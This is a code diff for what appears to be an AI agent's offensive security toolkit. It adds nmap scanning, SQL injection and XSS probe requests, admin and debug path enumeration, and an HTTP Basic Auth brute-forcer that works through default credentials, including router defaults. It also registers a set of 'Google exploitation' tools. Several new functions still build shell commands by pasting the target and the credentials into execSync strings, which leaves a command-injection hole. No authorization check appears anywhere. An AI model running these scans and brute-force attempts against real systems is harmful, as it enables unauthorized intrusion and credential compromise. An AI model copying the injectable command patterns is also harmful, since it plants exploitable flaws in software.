@@ -1,8 +1,17 @@
 import { rmSync, writeFileSync, mkdtempSync, readFileSync, existsSync } from 'node:fs';
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
-import { spawn, execSync } from 'node:child_process';
+import { spawn } from 'node:child_process';
 import type { ToolDefinition } from '../core/toolRuntime.js';
+import { createGoogleExploitationTools } from './googleExploitation.js';
+import { 
+  secureExecSync, 
+  secureSpawn, 
+  validateTarget as secureValidateTarget, 
+  validatePorts as secureValidatePorts, 
+  validateUrl as secureValidateUrl, 
+  validateBashCommand 
+} from '../core/errors/safetyValidator.js';
 
 const stateStore = new Map<string, unknown>();
 const rlState = { episode: 1, steps: 0, averageReward: 0.8 };
@@ -18,27 +27,125 @@ function makeEvidenceFile(prefix: string): string {
   return path;
 }
 
-// Network scanning utilities - Enhanced
+// Secure input validation utilities (wrapper functions)
+function validateTarget(target: string): boolean {
+  const result = secureValidateTarget(target);
+  if (!result.valid && result.error) {
+    console.error(`Invalid target: ${result.error.message}`);
+  }
+  return result.valid;
+}
+
+function validatePorts(ports: string): boolean {
+  const result = secureValidatePorts(ports);
+  if (!result.valid && result.error) {
+    console.error(`Invalid ports: ${result.error.message}`);
+  }
+  return result.valid;
+}
+
+function validateUrl(url: string): boolean {
+  const result = secureValidateUrl(url);
+  if (!result.valid && result.error) {
+    console.error(`Invalid URL: ${result.error.message}`);
+  }
+  return result.valid;
+}
+
+function safeExecSync(command: string, args: string[] = [], options: any = {}): string {
+  try {
+    const { spawnSync } = require('node:child_process');
+    const result = spawnSync(command, args, {
+      encoding: 'utf-8',
+      timeout: options.timeout || 30000,
+      stdio: ['pipe', 'pipe', 'pipe'],
+      shell: false // Never use shell mode
+    });
+    
+    if (result.error) {
+      return `Command failed: ${result.error.message}`;
+    }
+    
+    return result.stdout || '';
+  } catch (error: any) {
+    return `Execution error: ${error.message}`;
+  }
+}
+
+// Network scanning utilities - Enhanced and secured
 function runNmap(target: string, ports: string = '80,443,22,21,25,53,8080,8443,3306,3389,5432,27017,5985,5986,9200,9300'): string {
   try {
-    // Use connect scan (TCP) instead of SYN scan to avoid root privileges
-    const result = execSync(`/opt/homebrew/bin/nmap -sT -T4 -p ${ports} ${target}`, {
-      encoding: 'utf-8',
-      timeout: 24 * 60 * 60 * 1000
-    });
-    return result;
+    // Validate inputs
+    if (!validateTarget(target)) {
+      return `Invalid target: ${target}`;
+    }
+    
+    if (!validatePorts(ports)) {
+      return `Invalid ports: ${ports}`;
+    }
+    
+      // Use spawn with arguments instead of template strings
+      return safeExecSync('/opt/homebrew/bin/nmap', [
+        '-sT', '-T4', '-p', ports, target
+      ], {
+        timeout: 5 * 60 * 1000 // 5 minutes max for nmap scan
+      });
   } catch (error: any) {
     return `Scan failed: ${error.message}`;
   }
 }
 
+function runAggressiveNmap(target: string, ports: string = '1-10000'): string {
+  try {
+    // Validate inputs
+    if (!validateTarget(target)) {
+      return `Invalid target: ${target}`;
+    }
+    
+    if (!validatePorts(ports)) {
+      return `Invalid ports: ${ports}`;
+    }
+    
+    // Try SYN scan first (requires root)
+    try {
+      return safeExecSync('/opt/homebrew/bin/nmap', [
+        '-sS', '-sV', '-sC', '-O', '-T4', '-p', ports, target
+      ], {
+        timeout: 60 * 60 * 1000
+      });
+    } catch (error: any) {
+      // Fallback to TCP connect scan
+      return safeExecSync('/opt/homebrew/bin/nmap', [
+        '-sT', '-sV', '-sC', '-T4', '-p', ports, target
+      ], {
+        timeout: 60 * 60 * 1000
+      });
+    }
+  } catch (error: any) {
+    return `Aggressive scan failed: ${error.message}`;
+  }
+}
+
 function runAdvancedNmap(target: string, options: string = '-sV -sC -O --script=vuln'): string {
   try {
-    const result = execSync(`/opt/homebrew/bin/nmap ${options} ${target}`, {
-      encoding: 'utf-8',
-      timeout: 24 * 60 * 60 * 1000
+    // Validate target
+    if (!validateTarget(target)) {
+      return `Invalid target: ${target}`;
+    }
+    
+    // Parse and validate options
+    const optionArgs = options.split(/\s+/).filter(arg => arg.trim());
+    const allowedOptions = ['-sV', '-sC', '-O', '--script=vuln', '-sS', '-sT', '-T4', '-p-', '-Pn', '-A'];
+    
+    for (const arg of optionArgs) {
+      if (!allowedOptions.includes(arg) && !arg.startsWith('-p') && !arg.startsWith('--script')) {
+        return `Disallowed nmap option: ${arg}`;
+      }
+    }
+    
+    return safeExecSync('/opt/homebrew/bin/nmap', [...optionArgs, target], {
+      timeout: 60 * 60 * 1000 // 1 hour max
     });
-    return result;
   } catch (error: any) {
     return `Advanced scan failed: ${error.message}`;
   }
@@ -60,12 +167,48 @@ function checkCommonVulns(target: string, port: number): string[] {
     if (phpCheck.trim()) vulns.push('phpinfo_exposure');
     
     // Check for backup files
-    const backupFiles = ['.bak', '.old', '.backup', '.save', '.orig'];
+    const backupFiles = ['.bak', '.old', '.backup', '.save', '.orig', '.swp', '.swo', '.tmp'];
     for (const ext of backupFiles) {
       const backupCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}/index${ext}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
       if (backupCheck.trim()) {
         vulns.push(`backup_file_${ext}`);
         break;
+      }
+    }
+
+    // Check for SQL injection via error-based detection
+    const sqlCheck = execSync(`timeout 86400 curl -s -k "http://${target}:${port}/?id=1'" 2>&1 | grep -i -E '(sql|syntax|mysql|postgres|database)' || true`, {encoding: 'utf-8'});
+    if (sqlCheck.trim()) vulns.push('possible_sqli_error_based');
+    
+    // Check for XSS via reflection
+    const xssCheck = execSync(`timeout 86400 curl -s -k "http://${target}:${port}/?q=<script>alert(1)</script>" 2>&1 | grep -i '<script>alert' || true`, {encoding: 'utf-8'});
+    if (xssCheck.trim()) vulns.push('possible_xss_reflection');
+    
+    // Check for admin panel exposure
+    const adminPaths = ['/admin', '/admin/login', '/admin.php', '/wp-admin', '/administrator', '/management'];
+    for (const path of adminPaths) {
+      const adminCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}${path}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
+      if (adminCheck.trim()) {
+        vulns.push(`admin_panel_exposed_${path.replace(/\//g, '_')}`);
+        break;
+      }
+    }
+
+    // Check for exposed API endpoints
+    const apiPaths = ['/api', '/api/v1', '/rest', '/graphql', '/graphql/v1'];
+    for (const path of apiPaths) {
+      const apiCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}${path}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
+      if (apiCheck.trim()) {
+        vulns.push(`api_endpoint_exposed_${path.replace(/\//g, '_')}`);
+      }
+    }
+
+    // Check for exposed debug endpoints
+    const debugPaths = ['/debug', '/_debug', '/_profiler', '/_status', '/phpinfo'];
+    for (const path of debugPaths) {
+      const debugCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}${path}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
+      if (debugCheck.trim()) {
+        vulns.push(`debug_endpoint_exposed_${path.replace(/\//g, '_')}`);
       }
     }
     
@@ -216,6 +359,81 @@ function ftpBruteForce(target: string, port: number = 21): any {
     credentialsTested: commonCredentials.length,
     target,
     port
+  };
+}
+
+// HTTP Basic Auth brute force utility
+function httpBasicBruteForce(target: string, port: number = 80, path: string = '/', useSSL: boolean = false): any {
+  const commonCredentials = [
+    { username: 'admin', password: 'admin' },
+    { username: 'admin', password: 'password' },
+    { username: 'root', password: 'root' },
+    { username: 'root', password: 'password' },
+    { username: 'admin', password: '123456' },
+    { username: 'user', password: 'user' },
+    { username: 'admin', password: 'admin123' },
+    { username: 'administrator', password: 'admin' },
+    { username: 'admin', password: '' },
+    { username: 'guest', password: 'guest' },
+    { username: 'test', password: 'test' },
+    { username: 'support', password: 'support' },
+    { username: 'operator', password: 'operator' },
+    { username: 'manager', password: 'manager' },
+    { username: 'supervisor', password: 'supervisor' },
+    { username: 'fios', password: 'fios' },
+    { username: 'verizon', password: 'verizon' },
+    { username: 'router', password: 'router' },
+    { username: 'gateway', password: 'gateway' },
+    { username: 'admin', password: 'password123' },
+    { username: 'admin', password: 'admin@123' },
+    { username: 'admin', password: 'Admin@123' },
+    { username: 'admin', password: 'P@ssw0rd' },
+    { username: 'admin', password: 'P@ssw0rd123' },
+    { username: 'admin', password: '1234' },
+    { username: 'admin', password: '12345' },
+    { username: 'admin', password: '12345678' },
+    { username: 'admin', password: '123456789' },
+    { username: 'admin', password: 'adminadmin' }
+  ];
+  
+  let success = false;
+  let successfulCredential = null;
+  
+  const protocol = useSSL ? 'https' : 'http';
+  const url = `${protocol}://${target}:${port}${path}`;
+  
+  for (const cred of commonCredentials) {
+    try {
+      const cmd = `curl -k -s -u "${cred.username}:${cred.password}" "${url}" -I --connect-timeout 5 --max-time 10`;
+      const result = execSync(cmd, { encoding: 'utf-8' });
+      
+      // Check for successful response (200 OK or similar)
+      if (result.includes('200 OK') || result.includes('200') || 
+          (!result.includes('401 Unauthorized') && !result.includes('403 Forbidden'))) {
+        success = true;
+        successfulCredential = cred;
+        break;
+      }
+    } catch (error: any) {
+      // Check if error contains successful response
+      if (error.stdout && (error.stdout.includes('200 OK') || error.stdout.includes('200'))) {
+        success = true;
+        successfulCredential = cred;
+        break;
+      }
+      continue;
+    }
+  }
+  
+  return {
+    success,
+    successfulCredential,
+    credentialsTested: commonCredentials.length,
+    target,
+    port,
+    path,
+    useSSL,
+    url
   };
 }
 
@@ -1088,6 +1306,10 @@ export function createTaoTools() {
   for (const name of extraTools) {
     add(name, genericTool(name, 'focus'));
   }
+
+  // Integrate Google-specific tools
+  const googleTools = createGoogleExploitationTools();
+  tools.push(...googleTools.tools);
 
   return { id: 'tao-tools', tools };
 }
